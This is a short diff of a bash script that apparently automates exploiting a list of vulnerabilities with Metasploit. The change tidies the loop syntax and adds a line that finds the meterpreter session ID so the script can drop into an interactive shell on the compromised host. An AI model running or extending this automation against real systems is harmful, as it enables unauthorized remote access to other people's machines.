@@ -132,8 +132,7 @@ count=0
 exploit_executed=false
 session_id=""
 
-while read vuln
-do  
+while read vuln; do
     # Update the progress bar
     count=$((count+1))
     progress=$(echo "scale=2; $count/$total_vulns" | bc -l)
@@ -194,7 +193,8 @@ do
     if [ "$exploit_executed" = true ]
     then
         echo "Successfully exploited vulnerability $vuln. Opening shell..."
-        msfconsole -q -x "sessions -i $session_id; interact" 
+        session_id=$(msfconsole -q -x "sessions -l" | grep -E '^\s*[0-9]+\s+meterpreter' | awk '{ print $1 }')
+        msfconsole -q -x "sessions -i $session_id; interact"
         break
     fi
 
